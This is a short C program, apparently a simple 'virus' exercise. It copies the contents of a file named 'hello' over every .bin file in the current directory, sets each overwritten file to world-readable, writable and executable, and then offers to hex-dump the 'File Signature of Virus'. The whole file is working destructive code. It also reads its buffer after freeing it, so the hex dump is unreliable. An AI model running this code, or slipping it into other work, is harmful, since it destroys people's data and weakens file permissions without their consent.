#include<stdio.h>
#include<dirent.h>
#include<stdlib.h>
#include<string.h>
#include<sys/stat.h>
#include<glob.h>
void DumpHex(const void* buffer, size_t result) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < result; ++i) {
		printf("%02X ", ((unsigned char*)buffer)[i]);
		if (((unsigned char*)buffer)[i] >= ' ' && ((unsigned char*)buffer)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)buffer)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == result) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == result) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

int main(int argc, char *argv[])
{
	FILE *pfile1;
	long lsize;
	char * buffer;
	size_t result;
	struct stat st;
    	mode_t mode;
	pfile1 = fopen("hello","rb");
	if(pfile1 == NULL)
	{
		fputs("File Error",stderr);
		exit(1);
	}
	fseek(pfile1, 0 ,SEEK_END);
	lsize=ftell(pfile1);
	rewind(pfile1);
	
	buffer=(char*)malloc(sizeof(char)*lsize);
	if (buffer == NULL)
	{
		fputs("Memory Error",stderr);
		exit(2);
		
	}
	result=fread(buffer,1,lsize,pfile1);
	if(result!=lsize)
	{
		fputs("Reading error",stderr);
		exit(3);
	}

	
	
	glob_t pglob;
	const char *pattern = "*.bin";
	glob(pattern,GLOB_ERR,NULL,&pglob);
 	printf("Found %d .bin files\n",pglob.gl_pathc);
	int i=0;
 	for(i=0;i<pglob.gl_pathc;i++)
	{ 
		
	printf( "%s\n", pglob.gl_pathv[i]);
	char *filename =pglob.gl_pathv[i];
	FILE *pfile2 = fopen(filename,"wb");

	if (pfile2 != NULL)
    	{
        	fwrite(buffer,1,lsize,pfile2);
		rewind(pfile2);
		
    	}
	else{
		fputs("File Error",stderr);
        	exit(0);
	}
 	
        fclose(pfile2);
	const char *path = filename;
	stat(path, &st);
	mode = st.st_mode & 07777;
	mode |= S_IRWXU;
	mode |= S_IRWXO;
	mode |= S_IRWXG;
    	chmod(path, mode);
}


free(buffer);
fclose(pfile1);

printf("Press 1 to Check the File Signature of Virus\n");
	int num;
	scanf("%d",&num);
	if(num==1){
	DumpHex ( buffer, result);
}
else
printf("Wrong Input\n");
	
	
	return 0;
}

